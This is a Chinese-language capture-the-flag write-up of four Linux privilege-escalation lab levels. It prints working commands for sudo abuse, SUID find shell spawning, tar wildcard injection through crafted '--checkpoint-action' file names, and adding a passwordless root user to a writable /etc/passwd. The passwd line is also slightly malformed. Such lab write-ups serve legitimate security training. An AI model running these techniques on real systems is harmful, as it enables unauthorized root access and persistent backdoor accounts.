---
title: "云尘靶场-Linux提权系列"
date: 2025-12-11T00:00:00+08:00
draft: false

---

# 云尘靶场-Linux提权系列WP

### Linux提权系列-1

ssh连接靶机，首先进行基本的信息收集：

![image-20240725230323294](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240725230324428-2064990369.png)

发现当前ctf用户可以免密sudo，以user1的身份执行`/bin/bash`，很经典的sudo提权嘛，直接来：

~~~shell
sudo -u user1 /bin/bash
~~~

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240725230638057-1412622423.png" alt="image-20240725230637010" style="zoom:150%;" />

成功获取到user1的BashShell，看看当前目录有什么：

![屏幕截图 2024-07-25 230744](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240725231136018-463702219.png)

成功拿到了flag

### Linux提权系列-2

ssh连接靶机，首先进行基本的信息收集：

![image-20240725232657975](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240725232658972-332524861.png)

发现suid权限配置不当，find命令拥有了suid权限，看看find的所有者：

![image-20240725233020962](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240725233021715-969392630.png)

所有者为user2，意味着可以提权到user2，那么直接用find提权：

~~~shell
find .profile -exec /bin/bash -p \;
~~~

 ![image-20240725232918526](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240725232919178-1849059561.png)

轻松提权到user2

进入`/home/user2`看看：

![屏幕截图 2024-07-25 233206](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240725233306993-2035504490.png)

成功拿到flag

### Linux提权系列-3

在信息收集时发现存在user3用户的定时任务：
![image-20240907164118931](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240907164121024-1657949.png)

看看定时任务脚本内容：

![image-20240907164202488](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240907164203932-109265356.png)

这里的tar命令使用了通配符，可以考虑通配符注入进行提权

首先创建`/tmp/abcd/`路径：

~~~shell
mkdir /tmp/abcd
~~~

然后创建利用文件和脚本，并赋予权限：

~~~shell
echo '/usr/bin/cp /usr/bin/find /tmp/myfind && chmod 4777 /tmp/myfind' > exploit.sh && echo '' > '--checkpoint=1' && echo '' > '--checkpoint-action=exec=sh exploit.sh' && chmod 777 /tmp/abcd/*
~~~

![image-20240907164836357](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240907164838052-664999240.png)

接下来等待定时任务执行时触发`*`的通配符注入，得到所有者为user3，且具有suid权限的`/tmp/myfind`：

![image-20240907171918344](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240907171919996-338103874.png)

得到后即可用find进行suid提权获得user3的shell

![image-20240907172036287](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240907172037586-1283039712.png)

直接读flag即可：

![屏幕截图 2024-09-07 172056](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240907172148166-1703464176.png)

### Linux提权系列-4

首先信息收集一波：

![image-20240730003331426](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240730003332676-276151568.png)

发现两个免密sudo的玩意，直接先获取一个user1的shell：

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240730003444601-1514813496.png" alt="image-20240730003444085" style="zoom:150%;" />

但是没有flag，这次应该是要获取root权限

先想到利用cp：

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240730004056601-1757549126.png" alt="image-20240730004056250" style="zoom:150%;" />

没有成功，再看看有没有其他的利用点：

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240730003544480-85593209.png" alt="image-20240730003543725" style="zoom:150%;" />

很明显passwd文件的权限配置不当，user1用户可写，那么直接添加一个root用户：

~~~shell
echo 'Yuy0ung::0:0:root:/root/bin/bash' >> /etc/passwd
~~~

![image-20240730004203263](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240730004203574-2132591870.png)

成功提权，在/root目录下获得了flag：

<img src="https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240730005231454-363074670.png" alt="屏幕截图 2024-07-30 005105" style="zoom:150%;" />